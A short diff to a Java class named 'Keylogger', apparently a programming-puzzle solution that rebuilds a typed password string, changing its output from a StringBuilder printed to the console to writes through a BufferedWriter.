@@ -40,17 +40,15 @@ class Keylogger{
                     index--;
                 }
             }
-            StringBuilder sb = new StringBuilder();
             for(int p = 0; p < password.size(); p++){
-                sb.append(password.get(p));
+                bw.write(password.get(p));
             }
-            System.out.print(sb);
+            bw.newLine();
 //            for(int k = 0; k < password.size(); k++){
 //                System.out.print(password.get(k));
 //            }
 //            System.out.println();
         }
-        System.out.println();
         bw.flush();
         bw.close();
     }
